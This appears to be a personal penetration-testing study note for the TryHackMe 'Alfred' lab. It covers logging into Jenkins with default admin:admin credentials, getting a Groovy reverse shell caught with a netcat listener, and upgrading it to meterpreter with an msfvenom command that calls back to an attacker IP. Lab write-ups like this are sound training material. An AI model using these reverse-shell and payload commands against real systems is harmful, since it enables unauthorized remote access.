Logged in jenkins with `admin : admin`[[PNPT/WPE/Capstones/Alfred - THM/Enumeration|Enumeration]]

# Gaining Shell
---
![[Pasted image 20250420150637.png]]
- Paste this `shell`(replace bash with cmd.exe): https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
- [[Jenkins Groovy Shell]]
- `nc -lnvp 4444`
- ![[Pasted image 20250420150954.png]]

# Gaining meterpreter shell
----
- Get an `x86`shell using payload `windows/meterpreter/reverse_tcp`web delivery
	- ![[Pasted image 20250420152003.png]]
- Generate msfvenom executable with `meterpreter/x64`so that we have `x64`architecture:
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.8.98.106 lport=443 -f exe -o rev.exe`
- Upload this with previous shell and setup `multi/handler`with payload `windows/x64/meterpreter/reverse_tcp`then run the executable:
	- ![[Pasted image 20250420152142.png]]

